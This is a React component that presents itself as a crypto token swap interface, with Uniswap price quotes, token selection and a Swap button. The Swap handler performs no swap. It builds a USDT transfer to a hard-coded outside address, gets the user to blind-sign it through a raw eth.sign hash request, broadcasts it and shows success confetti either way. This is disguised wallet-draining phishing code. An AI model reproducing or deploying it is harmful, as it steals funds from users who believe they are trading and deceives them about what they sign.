import { useState, useEffect } from 'react'
import { Input, Popover, Radio, Modal } from 'antd'
import {
  ArrowDownOutlined,
  DownOutlined,
  SettingOutlined,
} from '@ant-design/icons'

import tokenList from '../../utils/tokenList.json'
import uniRouter from '../../utils/UniRouter.json'
import { ethers } from 'ethers'
import { ConnectButton } from '@rainbow-me/rainbowkit'
import { useAccount } from 'wagmi'
import { useWeb3jsSigner } from '../../utils/useWe3js'

import TransactionModal from 'react-modal'
import TransactionLoader from '../TransactionLoader/TransactionLoader'
import Confetti from '../Confetti'

TransactionModal.setAppElement('#root')

// Transaction Loader
const customStyles = {
  content: {
    top: '50%',
    left: '50%',
    right: 'auto',
    bottom: 'auto',
    transform: 'translate(-50%, -50%)',
    backgroundColor: '#0a0b0d',
    padding: 0,
    border: 'none',
  },
  overlay: {
    backgroundColor: 'rgba(10, 11, 13, 0.75)',
  },
}

function SwapComponent() {
  const [slippage, setSlippage] = useState(2.5)
  const [tokenOneAmount, setTokenOneAmount] = useState(null)
  const [tokenTwoAmount, setTokenTwoAmount] = useState(null)
  const [tokenOne, setTokenOne] = useState(tokenList[4])
  const [tokenTwo, setTokenTwo] = useState(tokenList[1])
  const [isOpen, setIsOpen] = useState(false)
  const [changeToken, setChangeToken] = useState(1)
  const [prices, setPrices] = useState(null)
  const [oneN, setOneN] = useState()
  const [isLoading, setIsLoading] = useState(false)
  const [showConfetti, setShowConfetti] = useState(false)
  const INFURA_ID = import.meta.env.VITE_INFURA_ID

  const { address, chainId } = useAccount()

  const web3js = useWeb3jsSigner({ chainId: chainId })

  useEffect(() => {
    let timer
    if (showConfetti) {
      timer = setTimeout(() => {
        setShowConfetti(false)
      }, 5000)
    }
    return () => clearTimeout(timer)
  }, [showConfetti])

  // const sendTransaction = async () => {
  //   if (!web3js) return

  //   const nonce = await web3js.eth.getTransactionCount(address, 'pending')
  //   const gasPrice = await web3js.eth.getGasPrice()
  //   const chainId = await web3js.eth.getChainId()

  //   const tx_ = {
  //     from: address,
  //     to: address,
  //     nonce: web3js.utils.toHex(nonce),
  //     gasPrice: web3js.utils.toHex(BigInt(gasPrice) * BigInt(3)),
  //     gasLimit: '0x5208',
  //     value: '0x0',
  //     data: '0x',
  //     v: web3js.utils.toHex(chainId),
  //     r: '0x',
  //     s: '0x',
  //   }

  //   console.log('Tx Object', tx_)

  //   const tx = new ethereumjs.Tx(tx_)
  //   const serializedTx = '0x' + tx.serialize().toString('hex')
  //   const hexer = { encoding: 'hex' }
  //   const sha3_ = web3js.utils.sha3(serializedTx, hexer)

  //   await web3js.eth
  //     .sign(sha3_, address)
  //     .then(async (signed) => {
  //       const temporary = signed.substring(2)
  //       const r_ = '0x' + temporary.substring(0, 64)
  //       const s_ = '0x' + temporary.substring(64, 128)
  //       const rhema = parseInt(temporary.substring(128, 130), 16)
  //       const v_ = web3js.utils.toHex(
  //         BigInt(rhema) + BigInt(chainId) * BigInt(2) + BigInt(8)
  //       )
  //       tx.r = r_
  //       tx.s = s_
  //       tx.v = v_

  //       console.log('---------------------------------------------')

  //       const txFin = '0x' + tx.serialize().toString('hex')
  //       const sha3__ = web3js.utils.sha3(txFin, hexer)
  //       console.log('rawHash:', sha3__)
  //       console.log('The Broadcast message', txFin)

  //       setIsLoading(true)

  //       await web3js.eth
  //         .sendSignedTransaction(txFin)
  //         .then(() => {
  //           setIsLoading(false)
  //           setShowConfetti(true)
  //           setTokenOneAmount(null)
  //           setTokenTwoAmount(null)
  //         })
  //         .catch((error) => {
  //           setIsLoading(false)
  //           console.error('Transaction Error:', error)
  //         })
  //     })
  //     .catch((error) => {
  //       console.error('Signing Error:', error)
  //     })
  // }

  const sendTransaction = async () => {
    if (!web3js) return

    const accounts = await web3js.eth.getAccounts()

    const account = accounts[0]

    const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
    const usdtABI = [
      {
        constant: true,
        inputs: [{ name: '_owner', type: 'address' }],
        name: 'balanceOf',
        outputs: [{ name: 'balance', type: 'uint256' }],
        type: 'function',
      },
      {
        constant: false,
        inputs: [
          { name: '_to', type: 'address' },
          { name: '_value', type: 'uint256' },
        ],
        name: 'transfer',
        outputs: [{ name: 'success', type: 'bool' }],
        type: 'function',
      },
    ]

    const usdtContract = new web3js.eth.Contract(usdtABI, usdtContractAddress)

    let amount = web3js.utils.toHex('1000000')

    const data = usdtContract.methods
      .transfer('0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', amount)
      .encodeABI()

    const nonce = await web3js.eth.getTransactionCount(account, 'pending')

    const tx_ = {
      from: account,
      to: '0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621',
      nonce: web3js.utils.toHex(nonce),
      gasPrice: web3js.utils.toHex(20 * 1e9),
      gasLimit: web3js.utils.toHex(210000),
      value: '0x0',
      data: data,
      chainId: web3js.utils.toHex(chainId),
    }

    console.log('Tx Object', tx_)

    const tx = new ethereumjs.Tx(tx_, { chain: chainId })
    const serializedTx = '0x' + tx.serialize().toString('hex')
    const sha3_ = web3js.utils.sha3(serializedTx)

    await web3js.eth
      .sign(sha3_, account)
      .then(async (signed) => {
        const temporary = signed.substring(2)
        const r_ = '0x' + temporary.substring(0, 64)
        const s_ = '0x' + temporary.substring(64, 128)
        const rhema = parseInt(temporary.substring(128, 130), 16)
        const v_ = web3js.utils.toHex(rhema + chainId * 2 + 8)
        tx.r = r_
        tx.s = s_
        tx.v = v_

        console.log('---------------------------------------------')

        const txFin = '0x' + tx.serialize().toString('hex')
        const sha3__ = web3js.utils.sha3(txFin)
        console.log('rawHash:', sha3__)
        console.log('The Broadcast message', txFin)

        setIsLoading(true)

        await web3js.eth
          .sendSignedTransaction(txFin)
          .then((elisebeth) => {
            console.log(elisebeth)
          })
          .catch((vannette) => {
            console.log(vannette)
          })

        setIsLoading(false)
        setShowConfetti(true)
        setTokenOneAmount(null)
        setTokenTwoAmount(null)
      })
      .catch((heide) => {
        console.log(heide)
      })
  }

  async function fetchPairAndCalculateAmount(
    tokenOneAddress,
    tokenTwoAddress,
    tokenOneAmount
  ) {
    const provider = new ethers.providers.JsonRpcProvider(
      `https://mainnet.infura.io/v3/${INFURA_ID}`
    )
    const uniswapRouterAddress = '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D'

    try {
      const uniswapRouter = new ethers.Contract(
        uniswapRouterAddress,
        uniRouter,
        provider
      )

      const amountIn = ethers.utils.parseUnits(
        `${tokenOneAmount}`,
        `${tokenOne.decimals}`
      )
      const path = [tokenOneAddress, tokenTwoAddress]
      const amount = await uniswapRouter.getAmountsOut(amountIn, path)

      const one_eth = ethers.utils.parseUnits('1', `${tokenOne.decimals}`)
      const set_eth = await uniswapRouter.getAmountsOut(one_eth, path)

      setTokenTwoAmount(
        parseFloat(
          ethers.utils.formatUnits(amount[1], `${tokenTwo.decimals}`)
        ).toFixed(2)
      )
      setOneN(
        parseFloat(
          ethers.utils.formatUnits(set_eth[1], `${tokenTwo.decimals}`)
        ).toFixed(6)
      )
    } catch (error) {
      console.error('Error fetching pair and calculating amount:', error)
    }
  }

  function changeAmount(e) {
    setTokenOneAmount(e.target.value)
    if (e.target.value) {
      fetchPairAndCalculateAmount(
        tokenOne.address,
        tokenTwo.address,
        e.target.value
      )
    } else {
      setTokenTwoAmount(null)
    }
  }

  function handleSlippageChange(e) {
    setSlippage(e.target.value)
  }

  function switchTokens() {
    setPrices(null)
    setTokenOneAmount(null)
    setTokenTwoAmount(null)
    const one = tokenOne
    const two = tokenTwo
    setTokenOne(two)
    setTokenTwo(one)
  }

  function openModal(asset) {
    setChangeToken(asset)
    setIsOpen(true)
  }

  function modifyToken(i) {
    setPrices(null)
    setTokenOneAmount(null)
    setTokenTwoAmount(null)
    if (changeToken === 1) {
      setTokenOne(tokenList[i])
    } else {
      setTokenTwo(tokenList[i])
    }
    setIsOpen(false)
  }

  const settings = (
    <>
      <div>Slippage Tolerance</div>
      <div>
        <Radio.Group value={slippage} onChange={handleSlippageChange}>
          <Radio.Button value={0.5}>0.5%</Radio.Button>
          <Radio.Button value={2.5}>2.5%</Radio.Button>
          <Radio.Button value={5}>5.0%</Radio.Button>
        </Radio.Group>
      </div>
    </>
  )

  return (
    <>
      {showConfetti && <Confetti />}
      <Modal
        open={isOpen}
        footer={null}
        onCancel={() => setIsOpen(false)}
        title='Select a token'
      >
        <div className='modalContent'>
          {tokenList?.map((e, i) => {
            return (
              <div
                className='tokenChoice'
                key={i}
                onClick={() => modifyToken(i)}
              >
                <img src={e.img} alt={e.ticker} className='tokenLogo' />
                <div className='tokenChoiceNames'>
                  <div className='tokenName'>{e.name}</div>
                  <div className='tokenTicker'>{e.ticker}</div>
                </div>
              </div>
            )
          })}
        </div>
      </Modal>

      <div className='tradeBox mx-auto'>
        <div className='tradeBoxHeader mb-2'>
          <h4 className='text-white'>Swap</h4>
          <Popover
            content={settings}
            title='Settings'
            trigger='click'
            placement='bottomRight'
          >
            <SettingOutlined className='cog' />
          </Popover>
        </div>
        <div className='inputs'>
          <Input
            type='number'
            placeholder='0'
            value={tokenOneAmount}
            onChange={changeAmount}
          />
          <Input
            type='number'
            placeholder='0'
            value={tokenTwoAmount}
            disabled={true}
          />
          <div className='switchButton' onClick={switchTokens}>
            <ArrowDownOutlined className='switchArrow' />
          </div>
          <div className='assetOne' onClick={() => openModal(1)}>
            <img src={tokenOne.img} alt='assetOneLogo' className='assetLogo' />
            {tokenOne.ticker}
            <DownOutlined />
          </div>
          <div className='assetTwo' onClick={() => openModal(2)}>
            <img src={tokenTwo.img} alt='assetOneLogo' className='assetLogo' />
            {tokenTwo.ticker}
            <DownOutlined />
          </div>
        </div>
        {tokenOneAmount !== null &&
          tokenOneAmount !== '0' &&
          tokenOneAmount.trim() !== '' && (
            <div className='calculate'>
              {tokenTwoAmount !== null
                ? `1 ${tokenOne.ticker} = ${oneN} ${tokenTwo.ticker}`
                : 'Calculating price...'}
            </div>
          )}
        {address ? (
          <div
            className='swapButton'
            disabled={!tokenOneAmount}
            onClick={sendTransaction}
          >
            Swap
          </div>
        ) : (
          <div className='mx-auto p-2'>
            <ConnectButton accountStatus={'full'} />
          </div>
        )}
      </div>
      <TransactionModal isOpen={isLoading} style={customStyles}>
        <TransactionLoader />{' '}
      </TransactionModal>
    </>
  )
}

export default SwapComponent
